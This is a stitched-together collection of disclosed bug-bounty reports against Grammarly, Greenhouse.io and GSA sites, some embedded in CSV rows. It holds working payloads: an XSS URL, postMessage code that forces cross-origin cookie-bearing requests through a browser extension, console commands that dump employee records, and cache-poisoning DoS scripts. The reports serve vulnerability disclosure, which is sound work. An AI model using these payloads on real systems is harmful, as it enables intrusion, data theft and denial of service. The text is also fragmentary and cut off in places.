Code 124 BytesWrap lines Copy Download1https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}

Here's a video showing both scenarios for free and premium:

Mitigation
I would first suggest to remove the config-parameter feature completely. The risk of adding new properties when using a partial TypeScript schema will just introduce this issue again if the schema is not updated. Another solution would be to change the properties in the schema which are critical into being non-partial, which means it can only contain the parts specified in the TypeScript-schema.
Impact
The XSS-issue affects all browsers and is not mitigated by any CSP, since you allow unsafe-inline and unsafe-eval. Any calls can be made as the attacker, since the javascript runs on the proper origin as the code already interacting with your APIs. However, there are more parameters in the config to modify that might change other things as well, not just creating an XSS. For example, desktop.windows.installURL and desktop.mac.installURL would be very interesting to also modify into proper URLs without any XSS needed, since you would then modify the APP-download for the installation files for the affected user, no XSS needed:
Code 301 BytesWrap lines Copy Download1https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22https://example.com%22},%22officeAddin%22:{%22installURL%22:%22https://example.com%22},%22desktop%22:{%22windows%22:{%22installURL%22:%22https://example.com%22},%22mac%22:{%22installURL%22:%22https://example.com%22}}}

Attacker could trigger Grammarly extension's gnar._fetch command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.
Description:
Page could Init Grammarly popup editor [no user gesture, helper]
Events have isTrusted property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.
As I understood: injected content script could successfully emit events to background page only if popup was initiated earlier.
That means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.
Not sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.
Sending commands to Grammarly content script
Active page could send commands to injected Grammarly content script using window.postMessage.
Command structure:
Code 129 BytesWrap lines Copy Download1window.postMessage({
2    grammarly: true,
3    action: 'tracking',
4    method: 'gnar._fetch',
5    props: {}
6    params: {}
7}, ""*"")
Commands handling in injected content script
Grammarly content script ""parses"" commands using this snippet:
Code 130 BytesWrap lines Copy Download1function Z(e) {
2    var t, n = e.action;
3    ... 
4    ""tracking"" === n && e.method && g.call(e.method, e.param, e.props)
5    ...
6}
tracking commands are later passed to this snippet:
Code 133 BytesWrap lines Copy Download1f.emitBackground(""tracking-call"", {
2    msg: e, // command's ""method"" field
3    data: t // command's ""props"" + ""params"" fields
4 }, s)
This f.emitBackground sends event to background page.
Commands handling in extension's background page
The extension uses next snippet to handle tracking commands from content script:
Code 865 BytesWrap lines Copy Download1function w(e, t) { // t = params + props
2    var n, a = o(e.split("".""), 2), // a = command's ""method"" field splitted by dot into array
3        c = a[0],
4        s = a[1];
5    if (""gnar"" === c) 
6        if (p.tracker.gnar)
7            if (""track"" === s) {
8                var u = o(t, 2),
9                    l = u[0], // 
10                    f = u[1];
11                p.tracker.gnar.track(r({
12                    eventName: g.gnarAppName + ""/"" + l // something not discovered yet 
13                }, f))
14            } else
15                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(
16                    ""gnar client does not have method '"" + s + ""' for '"" +
17                    e + ""' in runMessage"");
18    else b.error(""gnar client not available for '"" + e + ""' in runMessage"");
19    else b.error(""unrecognized'"" + e + ""' in runMessage "")
20}
p.tracker.gnar
That's an object with next structure:
Code 647 BytesWrap lines Copy Download1{
2    _batchId: 8,
3    _client: ""chromeExt"",
4    _clientVersion: ""14.858.1756"",
5    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, …},
6    _eventsUrl: ""https://gnar.grammarly.com/events"",
7    _fetch: ƒ (),
8    _instanceId: ""nxIwqgPE"",
9    _isTest: false,
10    _isUserReady: true,
11    _liteUrl: ""https://gnar.grammarly.com/lite"",
12    _logger: t {name: ""gnar"", level: 2, context: e, appender: ƒ},
13    _metric: t {name: ""gnar"", timersSink: ƒ, countersSink: ƒ, _fetch: ƒ, _sendTimeout: 7500, …},
14    _queue: [],
15    _storePingTimestamp: true,
16    _userId: ""701014151
17}
Additionally, it has a set of methods.

I guess p.tracker.gnar controls reporting telemetry events to Grammarly.

Attacker-controllable function call
Code 58 BytesWrap lines Copy Download1p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))
s = that's the second part of command's ""method"" field. E.g. ""method"": ""hello.grammarly"" -> s = 'grammarly'
t = params and props
This snippet could be rewritten as:
Code 57 BytesWrap lines Copy Download1GNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))
p.tracker.gnars .constructor and methods
p.tracker.gnar object could be overwritten using .constructor  and .setUser methods those allow changing some p.tracker.gnar properties. 
p.tracker.gnars .constructor
Code 659 BytesWrap lines Copy Download1function e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`
2            void 0 === s && (s = !1),
3            this._client = t,
4            this._clientVersion = n,
5            this._fetch = r,
6            this._containerIdManager = o,
7            this._logger = i,
8            this._metric = c,
9            this._storePingTimestamp = s,
10            this._instanceId = a.alphanumeric(8),
11            this._batchId = 0,
12            this._isUserReady = !1,
13            this._queue = [],
14            this._eventsUrl = e + ""/events"",
15            this._liteUrl = e + ""/lite"",
16            this._pingMaybe()
17        }
gnar.setUser/gnar._execQueue / gnar._send / gnar._doSend / gnar._enqueue
p.tracker.gnar has a set of interesting methods like setUser. Grammarly extension uses setUser to invalidate session. 
Code 115 BytesWrap lines Copy Download1a[""session-invalidate""] = function (e, t, n, r, o) {
2        ...
3        s.call(""gnar.setUser"", i, c)
4        ...
5}

I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. 

Team probably should know how much powerful listed above funcstions are. 
_fetch
p.tracker.gnar has _fetch property which points to fetch function.
More interesting is that, it's a polyfill, not a native function.

I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to data:/chrome-extension:/ origins.

That means, it's possible to call fetch() with attacker's params from the extension.
Code 71 BytesWrap lines Copy Download1p.tracker.gnar_fetch.apply(p.tracker.gnar, [""FetchURL"", ""FetchParams""])
Page has to call window.postMessage with next object to call fetch from the extension
Code 309 BytesWrap lines Copy Download1x = window.top.postMessage({
2    grammarly: true,
3    action: 'tracking',
4    method: 'gnar._fetch',
5    props: { // FetchParams
6        method: 'GET',
7        headers: {
8            'Content-Type': 'application/json'
9        }
10    },
11    param: 'https://mail.google.com/mail/u/0/#inbox' // <FetchURL>
12}, ""*"")
XHR + cookies
Grammarly extension has permissions to access all URLs and cookies from all origins.
Grammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.

(except chrome://, however, chrome-extension:// is allowed because of polyfill for fetch).

That means, it's possible to initiate requests with cookies to any origin. Web applications without ""direct CSRF protection"" (e.g. hidden field with some value, not token in cookies ) are controllable by attacker.

Supporting Material/References:

Screencast for POST tohttps://auth.grammarly.com/v3/user. [1st PoC]
Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] 


I didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.

Impact
Universal CSRF

Actually, ""Universal CSRF"" isn't a correct definition 😉. But I think it correctly expresses impact of the vulnerability.

Attacker could trigger Grammarly extension's gnar._fetch command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. 
Web applications without good protection against CSRF (hidden field in form, not cookies/origin check/etc.) are vulnerable to CSRF. 
Page could made any number of blind requests through Grammarly extension with cookies. 
Overwrite p.tracker.gnar and call any method of this object
p.tracker.gnar has a set of interesting methods like setUser. Grammarly extension uses setUser to invalidate session.

I assume, calling this methods leads to sending invalid telemetry data to Grammarly.

Possible UXSS via data manipulation
Attacker could overwrite p.tracker.gnar with arbitrary data. However, postMessage doesn't allow to send non-clonable objects.
Attacker could call something like:
Code 50 BytesWrap lines Copy Download1AnythingClonable.apply(Object, [AnythingClonable])

I didn't test this with File/Blob/FileList non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.


P.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at hackerone.com domain.

Although the site seems to require being authenticated as a Grammarly employee to use it, most methods and publications work without being authenticated. I was able to list user data including emails, access tokens and admin status just by using the Chrome Developer tools.
Description: I discovered that the following Meteor publications work without being authenticated:

activeUsers
allExtraFood
allOrders(date)
allUsers
allUserStats
allVendors
allVendorsItems
extraFoodFromToday
foodEventLog
foodSettings
itemsLimits
monthlyTop
vendorByName
vendorHistoryFromToday
vendorItemsByName
vendorsHistory

This means I can access the data stored in the following Meteor collections:

Meteor.users
ExtraFood
OrderItems
UserStats
Vendors
VendorsItems,
FoodEventLog
FoodSettings
VendorsItemsLimits
MontlyTopItems
VendorsHistory

The Meteor.users collection includes the email address of 300+ employees of Grammarly, along with their Okta and Google oauth access tokens, a hash of their login tokens, and their admin status. The FoodSettings collection also exposes some Grammarly user emails.
Based on the source code of the app, it seems that most Meteor methods also don't perform any authentication checks. But because they could perform destruction of data, I preferred not no use them when testing.
Browsers Verified In:

Chrome
Firefox

Steps To Reproduce:
(Add details for how we can reproduce the issue)

Visit https://food.grammarly.io and open the Chrome Developer Tools
In the console, run Meteor.subscribe('activeUsers')
Wait a few seconds, and run Meteor.users.find().forEach(e => console.log(e))
You will see all user's information, as seen in the screenshots

Supporting Material/References:

The Meteor Security page explains how this vulnerabilities can be fixed by implementing proper access control in the Meteor methods and publications

Impact
An attacker could use this vulnerability to get information about Grammarly employees. He/she could know which employees have admin privileges and target them in other attacks.
I wasn't able to use the Okta and Google tokens for anything of high impact. Also, the hashedLoginToken requires the attacker to reverse a SHA256 hash of a random secret, so exploiting it seems difficult.2 attachments:F642832: userlist.pngF642833: userdetail.png",https://hackerone.com/reports/745495,California,United States,San Francisco,2019,11,24,23,15

Description
I found that setting up a CORS in some places will check the protocol, but it allows using http scheme. In addition, any subdomain is considered trusted. If the origin is http://www.grammarly.com, then the server will respond: Access-Control-Allow-Origin: http://www.grammarly.com. That can lead to leakage of user data and unauthorized actions on behalf of the user.

In fact, this means that an attacker can use the MITM attack (Wi-Fi, local networks, etc.) to substitute client requests, thus replacing the origin. 
Important note: I very carefully read the program policy and focus on the fact that MITM attack is not made on the existent grammarly sites.
How it works
Image F517002: CORS.png 142.58 KiBZoom in Zoom out Copy Download
If an attacker can perform a mitm attack on a user, he can replace the requested content of any unencrypted request and produce a 302 redirect of the user to http: //evil.grammarly.com. Since the request is not unencrypted, the attacker can also replace the response and implement javascript that performs a requests to vulnerable endpoints. Thus, the vulnerable enpoint will think that the request came from the origin of the trust it trusts and will execute the request.
Using a header to send a CSRF token protects against such attacks. But I found a place where verification of the transferred token is not performed.
This vulnerability was perfectly described by James Kettle on OWASP AppSec EU 2017. You can watch the description of the vulnerability on the link to his presentation. https://youtu.be/wgkj4ZgxI4c?t=1139

Greenhouse.io,11-50,0.0,50m-100m,$100.00,Medium,5.45,Denial of Service,Bypass of request line length limit to DoS via cache poisoning,"irvinlim  submitted a report to Greenhouse.io.May 12th (5 years ago)Summary
This is a bypass of the fix that was introduced in response to report #334709. The bug in question was that it was possible to poison the cache of the generated JS file at https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey, by appending a URL-encoded NULL byte (%00), followed by an arbitrary string of characters. I found in that report that it was possible to cause a denial of service by making the resultant applicationURI and boardURI parameters too long such that the server rejects any request, causing a ERR_CONNECTION_CLOSED error. As clarified with @rongutierrez, the temporary fix implemented in #334709 was to limit the length of the request URI, which was sufficient to prevent the DoS in my PoC in that report.
However, even though I found that the length restriction was 1024 bytes, I managed to bypass this length restriction by using multi-byte UTF-8 characters, which get expanded into up to 12 URL-encoded bytes, which results in me being able to poison the cache once again, making the resultant applicationURI parameter greater than the limit allowed by the server, resulting in a DoS once again.
Description
I found that the request URI was restricted to 1024 characters AFTER decoding, which was evident from trial and error. This meant that %00 was treated as 1 character, even though the input was 3 bytes long. Since the number of characters is limited to 1024, we have the following:

24 characters for the path segment, including the query string: /embed/job_board/js?for=
1 character for the NULL byte %00 after decoding
Variable length in bytes for the board token, minimum 1 byte
998 characters remaining for our payload

The length for the resultant URI (in bytes) we had to hit to cause a DoS, was at least 6169 bytes (approximately) as established in the previous report. This consists of:

49 bytes for the URI prefix, including the hostname: https://boards.greenhouse.io/embed/job_board?for=
3 bytes for the NULL byte %00 after encoding
Variable length in bytes for the board token, minimum 1 byte
6116 bytes remaining that will arise from our payload

Meanwhile, I had a theory that UTF-8 characters would be treated as a single character as well. This meant that for a single character like ""♥"", this is a 3-byte UTF-8 character, that gets URL encoded into %E2%99%A5, which is 9 bytes long. We can even use a 4-byte UTF-8 character which would give us 12 URL encoded bytes. This means that, even though we only have 998 characters, we can amplify this by up to a factor of 12x.
True enough by sending a request, using ""♥"" as our repeated payload 992 times, we can poison the cache with an amplified result as follows:
Code 152 BytesWrap lines Copy Download1#!/bin/sh
2
3REPEAT=992
4ID=623145
5curl --http1.1 -s ""https://boards.greenhouse.io/embed/job_board/js?for=a%00`python -c 'print(\""♥\"" * '$REPEAT')'`$ID"" -v

This is 8987 characters in the URI prefix alone, which is beyond the 6169 bytes limit that causes the ERR_CONNECTION_CLOSED error in the previous report. This results in a similar DoS which is not mitigated.
The execution log can be found in execution-log.txt (F296561).
Recommended Fix
We can see that the previously implemented fix to limit the length of the request URI string to 1024 characters was insufficient, since we only need 510 times 12 bytes of URL encoded 4-byte UTF-8 characters to cause a DoS, assuming that the board token is a single byte (a).
As mentioned in the previous report #334709, it is much, much more foolproof to perform a whitelisting of the board token in the URL.
Alternatively, since it seems that this endpoint requires fetching of data from the database based on the board token that was extracted from the query string parameter, instead of reflecting the for parameter into the boardURI/applicationURI parameter in the JS file, why not take the value from the database instead, since it's guaranteed that it will not be unsafe?
Alternatively, you can choose to limit the request length further to a smaller size (maybe less than 500), but if your application server is able to maybe read UTF-16 or UTF-32 this would come to the same result once again, though I don't think that it's really possible.
The recommended fix is really to not reflect the untrusted user's input which would be reflected onto the cache-poisoned file, regardless if you validate the input query string parameter, or to just take the board token URI from the database and not the request URI. This would really ensure that the fix would be foolproof.
Impact
As reiterated in the previous reports, an attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.1 attachment:F296561: execution-log.txt",https://hackerone.com/reports/350847,New York,United States,New York,2018,5,12,11,16
Greenhouse.io,11-50,0.0,50m-100m,$500.00,Medium,5.8,Improper Null Termination,Cache poisoning using NULL bytes and long URLs,"irvinlim  submitted a report to Greenhouse.io.Apr 8th (5 years ago)This is related to a previous report I made (https://hackerone.com/reports/326639). The same endpoint (https://boards.greenhouse.io/embed/job_board/js?for=) is still vulnerable to arbitrary string injection, by terminating the customer key in the for parameter with a URL-encoded NULL byte (i.e. %00), followed by an arbitrary string of text.
Although this may seem trivial since strings are URL escaped anyway (see the previous report), I realised that we can inject an extremely large number of arbitrary characters after the NULL byte, which will be propagated to the boardURI and applicationURI values in the Grnhse.Settings object, as follows:

This generated JS file is cached on the Greenhouse CDN/servers for an undetermined amount of time, which allows the same poisoned JS file to be loaded from the original URL at https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey. This means that when a job application page is requested using applicationURI as the prefix, the extremely long URL will be prefixed onto the actual iframe URL.
We can see that the value of the applicationURI URL prefix is 6155 bytes long, which is close to the maximum number of bytes in the URL I was able to send to the board.greenhouse.io server, before receiving ERR_CONNECTION_CLOSED. Since the applicationURI usually takes the form https://boards.greenhouse.io/embed/job_app?for=surveymonkey&token=XXXXXXX, where the token parameter is around 6-7 bytes long, these extra bytes for the token parameter are just enough so that the URL is now around 6169 bytes, enough to cause a ERR_CONNECTION_CLOSED error from the web server when the user opens the job application page with an iframe, resulting in a denial of service preventing him/her from loading the job application URL.

I have omitted the proof of concept that this exploit bricks a live job board from start to finish, since it has already been proven in the previous report that we can cause a denial of service by changing the applicationURI in the JS file. If necessary, I will try to reproduce it on an actual job board, but I do not own a Greenhouse account to test it on.
However, I have attached a proof of concept for cache poisoning the JS file, which shows that the NULL bytes and the arbitrary strings are able to be injected into the applicationURI value.
Proof of Concept
Visit https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey, whose cache is still poisoned at the moment.
Root Cause
The for parameter value is being copied verbatim into the resultant URL in the JS file.
Impact
If an attacker has knowledge about the underlying cache and network architecture, the attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.1 attachment:F283193: null-byte-injection-command.txt",https://hackerone.com/reports/334709,New York,United States,New York,2018,4,8,16,15
Greenhouse.io,11-50,0.0,50m-100m,$100.00,Medium,5.3,Information Exposure Through Debug Information,Debug information disclosure on oauth-redirector.services.greenhouse.io,"ajxchapman  submitted a report to Greenhouse.io.Feb 12th (5 years ago)Summary:
The configuration of the Sintra framework application hosted at oauth-redirector.services.greenhouse.io exposes internal information when exceptions occur. The application is configured with the show_exceptions setting which causes internal application configuration, environment variables and source code snippets to be exposed when exceptions occur.
Description:
When an unhandled exception occurs (such as providing an invalid oauth_redirect_uri cookie value to /integrations/oauth/create) the application produces a nicely formatted error page which lists internal application data such as configuration, environment variables and source code snippets.
This issue was identified whilst assessing the security of the OAuth login function at https://app.greenhouse.io/users/sign_in
Steps To Reproduce:

Send the following HTTP request to https://oauth-redirector.services.greenhouse.io/integrations/oauth/create?state=x&code=x:

Supporting Material/References:
See the attached screenshot and saved HTML of an application error.
Impact
Information provided by this exception, or other exceptions exposed by the Sintra framework due to the show_exceptions configuration setting, could allow an attacker to obtain sensitive internal configuration or source code snippets.2 attachments:F262638: greenhouse.io.htmlF262639: Screen_Shot_2018-02-12_at_14.08.09.png",https://hackerone.com/reports/315205,New York,United States,New York,2018,2,12,14,25
Greenhouse.io,11-50,0.0,50m-100m,$500.00,Medium,5.8,Denial of Service,DoS through cache poisoning using invalid HTTP parameters,"irvinlim  submitted a report to Greenhouse.io.Mar 16th (5 years ago)I was taking a look into a related report (https://hackerone.com/reports/298265) and I discovered that the https://boards.greenhouse.io/embed/job_board/js?for= endpoint doesn't throw errors when I try to pass in an array of for parameters like this:

Instead, in the resultant JS, we can see that the HTTP parameters are escaped and injected into the Grnhse.Settings object:

When fetching the actual correct endpoint (https://boards.greenhouse.io/embed/job_board/js?for=twitter), we see that the result for twitter is cached, returning the same corrupted URIs in the JS file. From my tests, it seems that these endpoints are cached for an unknown amount of time, with some staying in the cache for only a few minutes while others may be an hour or longer.
I also found out that the particular endpoint is on CloudFront by observing one of the IP addresses which served the file (35.164.91.227) and corroborating it with the IP range list published by AWS (https://ip-ranges.amazonaws.com/ip-ranges.json). However, fetching from different edge servers seems to result in the same mutated file being fetched at the correct endpoint (https://boards.greenhouse.io/embed/job_board/js?for=twitter). I conclude that there is a second layer of caching somewhere on the application layer.
The impact of corrupting the boardURI and applicationURI values is that the job_app or job_board iframes would fail to load in the client's website since the URI is incorrect, resulting in a denial of service for the client. One example is that Airbnb's job application page shows a Greenhouse.io error page (see attached images), which I managed to replicate it twice and lasted for about 20 minutes and less than 5 minutes respectively.
I tried to investigate if I could reliably replicate this PoC by waiting for cache to expire, as well as across several domains, but failed to find anything conclusive without knowledge of the underlying network architecture. Additionally, I am not sure if what is going on at play is due to a cache, and seeing that some IDs take quite a while to recover back to its normal state, I will stop trying to replicate the attack for now.
P.S. This is my first report, so do let me know if I could be of more help!
Impact
If the attacker has more patience and knowledge about the underlying architecture, the attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.2 attachments:F272864: airbnb_error-1.pngF272865: airbnb_error-2.pngSummary by irvinlimGreenhouse.io allows its customers to embed iframes using its provided JS SDK on https://boards.greenhouse.io/embed/job_board/js?for=twitter, for Twitter for example. (Twitter does not seem to use Greenhouse.io anymore, but their account still exists.)
I found that using parameter arrays (e.g. for[]=twitter) still loads the correct JS file, but with different URLs for the job board and application iframes. This file turns out to be cached, which I had effectively poisoned even when accessing the original URL (i.e. https://boards.greenhouse.io/embed/job_board/js?for=twitter). This results in a denial of service of the Greenhouse.io iframes that would be embedded in the customer's site, for around 20-30 minutes until the cache was cleared again.",https://hackerone.com/reports/326639,New York,United States,New York,2018,3,16,13,26

The Scout24 Security Team did a penetration test against scout24.greenhouse.io in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against OWASP Top 10 using industry common metholodogies. 
Reproduction steps

Visit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed this one)
After completing your personal information, you can upload some documents

Click Attach both under Resume/CV and Cover Letter
Upload some PDF files from your local host (in my case the file uwas called neu.pdf)


In the end you send your application by clicking on Submit Application

Using a HTTP proxy (in my case that was Burp) I was able to intercept the POST request made by the browser before being sent to the greenhouse.io API. This is some sample request:

As you can notice the files have been already uploaded to AWS and therfore a S3 bucket links are
used within the requests. 
Exploitability
Using a browser and a HTTP proxy the request can be easily intercepted. In the original request the Content-Disposition parameter job_application[cover_letter_url] in the POST request contains a S3 bucket link. However, after tampering the request, the parameters values can be changed. In our specific case the value (basically an URL) could be changed to:

a phishing site
a site containing some malware

After intercepting the request, the parameter was modified like this:

Whenever the hiring manager will try to view the uploaded content, the application will not be able to render the content. Instead the person will then try to download the file by clicking on Download (left upper corner). Although the browser shows that the URL points to some specific AWS domain, the content is actually loaded from somewhere else (in this case from https://google.com). 
Again, an attacker could then submit some URL containing malicious content or some phishing site. Only for the purpose of this report, something unspectacular like https://google.com has been chosen. 
Impact
The attack can be conducted in multiple scenarios:

anonymous person applies for some jobs and manipulates the parameters (like described above)
internal employee adds referal for some person and also manipulates the parameters

In both cases the hiring manager would then unknowingly access the manipulated links which could then lead to:

installation of trojan horses / ransomeware (in general malicious content)
a phishing site where e.g. AD credentials are claimed to be required
CSRF (Cross-Site Request Forgery) attacks

Remediation
The affected parameter should be first validated against some regular expression (e.g. allow only links that point to grnhse-prod-jben-*.s3.amazonaws.com). 3 attachments:F157687: Selection_120.pngF157688: Selection_121.pngF157689: Selection_119.pngrongutierrez Greenhouse.io staff  posted a comment. Feb 6th (6 years ago)Hi @cyneox,

Your subdomain blog.greenhouse.io is pointing to the service called Hubspot. However, your account at Hubspot has expired or has been cancelled. This basically means that anyone can claim your subdomain pointing to Hubspot and create their own site at this URL. This is EXTREMELY dangerous as whatever the attacker want can be placed on this domain. This is also a foolproof phishing attack since no one would be able to verify that this is not a legit greenhouse.io-login form.
I have temporarily claimed this domain for PoC. You should immediately remove the DNS-entry for blog.greenhouse.io pointing to Hubspot.
And since I'm able to run javascript at Hubspot, I'm able to do whatever I like on that domain. Creating a login form that would fool anyone, since it's present on a greenhouse.io domain.

Greenhouse.io,11-50,0.0,50m-100m,$500.00,High,7.95,Phishing,Subdomain Takeover on demo.greenhouse.io pointing to unbouncepages,"hacker2202  submitted a report to Greenhouse.io.Sep 8th (4 years ago)Actuall this report is same as of this one:- https://hackerone.com/reports/38007  
Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.
Here there is a greenhouse domain  (demo.greenhouse.io) which is pointing towards unbounce pages so  this domain can be taken over can can be used to do any type of attacks mostly i can make a fake login page on your behalf and spoof your users, this is a critical vulnerability and needs to be fixed .
Vulnerable url : demo.greenhouse.io

Hi. I found an Insecure Direct Object Reference vulnerability on the http://192.168.119.128:1337/v0/build/ endpoint.
Image F200108: vv.PNG 6.19 KiBZoom in Zoom out Copy Download
When the user wants to restart the build, next request are sent to the endpoint:
Code 35 BytesWrap lines Copy Download1{""site"":<siteid>,""branch"":""master""}
where siteid is numeric ID of the site.
However, this endpoint does not check, do this site ID belongs to this user. So the any user can restart the build of the site on any other user account. So it can be classified as partial authentication bypass.
POC
I restarted the build on my localhost inscance on behalf of another user:

Steps to reproduce

Login to the Federalist with your test account (we call it user1).
Restart the build on one of the sites belongs to you.
Catch the request to the 

Code 37 BytesWrap lines Copy Download1http://192.168.119.128:1337/v0/build/
and change site parameter to the siteID, which was created on some other account (we call it user2).
4. Execute the request. It will be accepted.
5. Login as user2 and go to this site's builds. You will notice that build was restarted by another user.
Suggested fix
It looks like other endpoint (e.g. site settings modify) checks the site id correctly. The fix is add additional check too on this specific endpoint.2 attachments:F200108: vv.PNGF200109: x.PNGSummary by sp1d3rsThanks to the 18F team for the great experience, fast fix, and the bounty!
The report details (i requested the limited disclosure due to sensitive info in the attachments):
Description
I found an Insecure Direct Object Reference vulnerability on the /v0/build/ and /v0/build/<siteid>/log API endpoints.
For example, when the user wants to restart the build, next request is sent to the endpoint:
Code 35 Bytes1{""site"":<siteid>,""branch"":""master""}
where siteid is numeric ID of the site.
However, this endpoint does not check, do this site ID belongs to this user. So any user can restart the build of the site on any other user account.
Steps to reproduce

Login to the Federalist with your test account (we can call it user1).
Restart the build of some site which belongs to you.
Catch the request to the 

Code 31 Bytes1http://localhost:1337/v0/build/
and change site parameter to the siteID, which was created on some other account (we can call it user2).
4. Execute the request. It will be accepted and processed.
5. Login as user2 and go to the builds page. You will notice that build was restarted by another user.
Suggested fix
Correct checking of user permissions on this endpoints should fix the issue.

GSA Bounty,11-50,0.0,1m-10m,$750.00,High,7.5,Violation of Secure Design Principles,Cache poisoning DoS to various TTS assets,"nathand  submitted a report to GSA Bounty.Nov 4th (3 years ago)I have recently come across a technique to force a Cloudfoundry app to return a HTTP 404 error when requesting any resource, which contains cache friendly headers. What this means is, if the Cloudfoundry app in question is behind a web cache like Cloudfront or Cloudflare etc, it will possibly store a copy of the 404 error response as the cache for the resource being requested, which is served to other users. This describes a cache poisoning Denial of Service, and the concept for this is detailed at https://cpdos.org.
The technique to achieve CPDoS against a Cloudfoundry and hence TTS app is to send a request with the following header:
Code 17 BytesWrap lines Copy Download1X-CF-APP-INSTANCE
This header is designed to allow admins to debug CF apps, by choosing which app instance they want serving their request. However, if we supply this header with a bad value, it will force the gorouter in the Cloudfoundry stack to issue a HTTP 404, e.g.:
Code 24 BytesWrap lines Copy Download1X-CF-APP-INSTANCE: xxx:1
Please note: I have already reported this to Pivotal/Cloudfoundry by contacting their security email address directly. They have not yet confirmed the vulnerability, although I'm fairly confident the issue exists in gorouter. However, I thought it relevant to report this to you regardless, as you should be able to mitigate this vulnerability without waiting for Pivotal to release an update for gorouter, by configuring your web caches/WAFs appropriately (don't cache 404's, strip out this header etc). With that said, I understand if this report is not valid due to this - if this is the case, a heads up so I can close it from my end would be appreciated.
The following assets appear to be vulnerable:
Code 58 BytesWrap lines Copy Download1analytics.usa.gov
2federation.data.gov
318f.gsa.gov
4code.gov
Please note that this is not an exhaustive list as I did not test against every asset in scope, however I did attempt the poisoning against login.gov and did not succeed, which I suspect might be because login.gov is specifically configured not to cache 404 errors. With that said, the config for login.gov may provide a means to protect the above listed assets and others that may be vulnerable.
Proof of concept
To poison the cache for a resource, the following script can be used - in this case, https://federation.data.gov/?cb=xxx is being poisoned to serve a 404 error to other users. Please note the presence of the ?cb=xxx query string - this is designed to be a ""cache buster"", to prevent poisoning the real home page. You may need to change the cache buster value to avoid hitting a previous successful cached copy.
Code 440 BytesWrap lines Copy Download1#!/bin/bash
2
3while true
4do
5    printf 'GET /?cb=xxx HTTP/1.1\r\n'\
6'Host: federation.data.gov\r\n'\

13'\r\n'\
14    | openssl s_client -ign_eof -connect federation.data.gov:443
15    sleep 1
16done
(FYI the poisoning script can probably sleep longer than 1 second - this is just to make sure the poisoning takes effect)
You should see 404 errors being returned in this script's output. Because the web cache appears to key on Cookie header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):
Code 167 BytesWrap lines Copy Download1curl -i -s -k -X $'GET' \
2    -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
3    $'https://federation.data.gov/?cb=xxx'
If there are specific resources and assets which don't key cache on cookie headers, then these will probably be easier to exploit against more users. 
In this asset's case, the error will be:
Code 104 BytesWrap lines Copy Download1404 Not Found: Requested route ('cg-06ab120d-836f-49a2-bc22-9dfb1585c3c6.app.cloud.gov') does not exist.
A bonus here is this error reveals an ""internal"" hostname otherwise not accessible to an attacker.
Given the assets all appear to use Cloudfront for caching, it is true that the poisoning will be regional - however, it is fairly trivial to acquire VPS' around the world (or perhaps just around the US in this case) to poison specific regions, and using a tool like https://www.nexcess.net/web-tools/dns-checker/, an attacker may be able to determine regional IPs for the asset, and poison regions by directly targeting them (not confirmed - I was aware of a technique to do this but was unable to confirm this).
One thing I did notice is these poisoning attacker requests may not hit the app logs in Cloudfoundry, e.g. the cf logs APP_NAME output, since it errors at the gorouter. If you have app logging dependent on displaying what is visible in the CF app logs, it may not detect these attacks.
Impact
By exploiting this vulnerability, an attacker may be able to achieve denial of service for various TTS assets, particularly to new users.",https://hackerone.com/reports/728664,New South Wales,Australia,Sydney,2019,11,4,7,36

GSA Bounty,11-50,0.0,1m-10m,$300.00,Medium,5.45,Cross-Site Request Forgery (CSRF),"Cross-Site Request Forgery on the Federalist API (all endpoints), using Flash file on the attacker's host","sp1d3rs  submitted a report to GSA Bounty.Aug 26th (5 years ago)Summary by sp1d3rsThanks to the 18F team for the great experience, fast fix, and the bounty!
The report details (i requested the limited disclosure due to lot of sensitive info in the attachments and report itself, and possibility to use a Summary as a kind of structured write-up):
Hello. At the beginning of my work with TTS Bug Bounty program, I noticed, that Federalist API does not have any CSRF protection - but was unable to make proper POC, since data had JSON format, and the Content-Type header was correctly checked.
However, I was able to forge valid Content-Type header using flash file now, after reading some articles of other researchers.
I recommend to read this article first to fully understand the issue:
http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/
